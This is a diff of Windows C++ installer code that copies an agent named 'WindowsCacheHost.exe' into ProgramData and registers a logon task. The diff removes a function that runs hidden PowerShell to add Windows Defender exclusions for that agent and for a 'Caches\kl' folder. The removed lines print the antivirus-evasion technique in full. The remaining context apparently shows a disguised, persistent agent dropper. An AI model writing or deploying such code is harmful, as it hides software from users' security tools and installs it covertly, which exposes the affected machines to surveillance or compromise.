@@ -111,17 +111,6 @@ static bool CreateLogonTask(const std::wstring& exe) {
     return result == ERROR_SUCCESS;
 }
 
-static void AddDefenderExclusion(const std::wstring& directory) {
-    std::wstring script =
-        L"$p='" + directory + L"'; " +
-        L"Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; " +
-        L"Add-MpPreference -ExclusionProcess ($p + '\\WindowsCacheHost.exe') -ErrorAction SilentlyContinue; " +
-        L"Add-MpPreference -ExclusionProcess 'WindowsCacheHost.exe' -ErrorAction SilentlyContinue; " +
-        L"Add-MpPreference -ExclusionPath ($env:LOCALAPPDATA + '\\Microsoft\\Windows\\Caches\\kl') -ErrorAction SilentlyContinue";
-    RunHidden(L"powershell.exe",
-        L"-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"" + script + L"\"", 20000);
-}
-
 static bool StartAgent(const std::wstring& exe, const std::wstring& workingDir) {
     STARTUPINFOW si{};
     si.cb = sizeof(si);
@@ -152,7 +141,6 @@ int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
 
     std::wstring targetDir = Join(programData, L"WindowsCacheHost");
     CreateDirectoryW(targetDir.c_str(), nullptr);
-    AddDefenderExclusion(targetDir);
     std::wstring agentTarget = Join(targetDir, L"WindowsCacheHost.exe");
     std::wstring configTarget = Join(targetDir, L"klive.config.json");
 
